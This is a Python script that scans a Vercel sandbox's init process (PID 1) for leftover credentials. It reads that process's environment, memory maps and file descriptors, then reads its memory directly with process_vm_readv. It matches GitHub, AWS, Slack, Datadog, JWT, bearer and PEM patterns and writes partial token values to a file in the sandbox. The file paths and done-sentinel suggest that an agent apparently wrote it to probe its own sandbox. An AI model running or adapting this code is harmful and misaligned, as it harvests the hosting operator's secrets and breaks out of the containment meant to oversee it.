# -*- coding: utf-8 -*-
"""pid1_scan: 扫 sandbox-init (PID 1) 环境/内存/fd 找凭据残留
Phase1: /proc/1/environ + /proc/1/cmdline
Phase2: /proc/1/maps 摘要(找数据段/堆/栈)
Phase3: /proc/1/fd 列表 + fdinfo(连接目标)
Phase4: process_vm_readv 扫数据段/堆/栈找 token 模式
输出落盘 + 哨兵 PID1_DONE"""
import os, re, sys, time

OUT = '/vercel/sandbox/pid1_scan.out'
f = open(OUT, 'w', encoding='utf-8')


def log(s):
    f.write(str(s) + '\n')
    f.flush()


PATTERNS = [
    (re.compile(rb'vcp_[A-Za-z0-9_\-]{20,}'), 'vcp_token'),
    (re.compile(rb'Bearer [A-Za-z0-9_\-\.]{20,}'), 'bearer'),
    (re.compile(rb'gh[pousr]_[A-Za-z0-9]{30,}'), 'github_token'),
    (re.compile(rb'AKIA[0-9A-Z]{16}'), 'aws_key'),
    (re.compile(rb'-----BEGIN [A-Z ]+-----'), 'pem'),
    (re.compile(rb'xox[baprs]-\d+'), 'slack'),
    (re.compile(rb'ddog_[A-Za-z0-9]{20,}'), 'datadog_key'),
    (re.compile(rb'api_key.{0,20}'), 'apikey_near'),
    (re.compile(rb'x-datadog-api-key.{0,60}', re.I), 'dd_api_key_hdr'),
    (re.compile(rb'secret.{0,40}', re.I), 'secret_near'),
    (re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}'), 'jwt'),
    (re.compile(rb'sk_[A-Za-z0-9]{20,}'), 'sk_token'),
]

log('=== PHASE1 environ/cmdline ===')
try:
    env = open('/proc/1/environ', 'rb').read()
    log('environ len=%d' % len(env))
    for kv in env.split(b'\x00'):
        if kv:
            # 值脱敏: 只显示 key 和前 4 字符
            k, _, v = kv.partition(b'=')
            log('  %s=%s...' % (k.decode(errors='replace'), v[:4].decode(errors='replace')))
except Exception as e:
    log('environ err %s' % e)
try:
    cmd = open('/proc/1/cmdline', 'rb').read()
    log('cmdline: %s' % cmd.replace(b'\x00', b' ').decode(errors='replace'))
except Exception as e:
    log('cmdline err %s' % e)

log('=== PHASE2 maps ===')
try:
    maps = open('/proc/1/maps').read().splitlines()
    log('maps lines=%d' % len(maps))
    for ln in maps:
        parts = ln.split()
        if len(parts) >= 2 and parts[1] == 'rw-p':
            log('RW %s %s' % (parts[0], parts[-1] if len(parts) > 5 else ''))
except Exception as e:
    log('maps err %s' % e)

log('=== PHASE3 fds ===')
try:
    for fd in sorted(os.listdir('/proc/1/fd'), key=int):
        try:
            tgt = os.readlink('/proc/1/fd/' + fd)
            log('fd%s -> %s' % (fd, tgt))
        except Exception as e:
            log('fd%s ERR %s' % (fd, type(e).__name__))
except Exception as e:
    log('fd err %s' % e)

log('=== PHASE4 memory scan ===')
import ctypes
libc = ctypes.CDLL(None, use_errno=True)
pid = 1
# process_vm_readv 签名
LOCAL = ctypes.c_ssize_t
REMOTE = ctypes.c_ssize_t


def read_range(start, size):
    if size <= 0 or size > 8 * 1024 * 1024:
        return b''
    buf = ctypes.create_string_buffer(size)
    local_iov = (ctypes.c_void_p * 2)(ctypes.addressof(buf), size)
    remote_iov = (ctypes.c_void_p * 2)(start, size)
    n = libc.process_vm_readv(pid, local_iov, 1, remote_iov, 1, 0)
    if n < 0:
        return b''
    return buf.raw[:n]


# 从 maps 解析可读段 (r--, rw-, r-x)
regions = []
try:
    for ln in open('/proc/1/maps').read().splitlines():
        parts = ln.split()
        if len(parts) < 2:
            continue
        if not parts[1].startswith('r'):
            continue
        lo, _, hi = parts[0].partition('-')
        regions.append((int(lo, 16), int(hi, 16), parts[1], parts[-1] if len(parts) > 5 else ''))
except Exception:
    pass
log('readable regions=%d' % len(regions))

hits = 0
for lo, hi, perm, name in regions:
    size = hi - lo
    # 跳过超大段(>64MB) 和 [vsyscall] 等
    if size > 64 * 1024 * 1024 or 'vsyscall' in name or 'vvar' in name:
        continue
    data = read_range(lo, size)
    if not data:
        continue
    for pat, tag in PATTERNS:
        for m in pat.finditer(data):
            val = m.group(0)
            log('HIT[%s] @0x%x %s...' % (tag, lo + m.start(), val[:60].decode(errors='replace')))
            hits += 1
            if hits > 20:
                log('too many hits, stop')
                break
        if hits > 20:
            break
    if hits > 20:
        break
log('scan done, hits=%d' % hits)

log('PID1_DONE')
f.close()
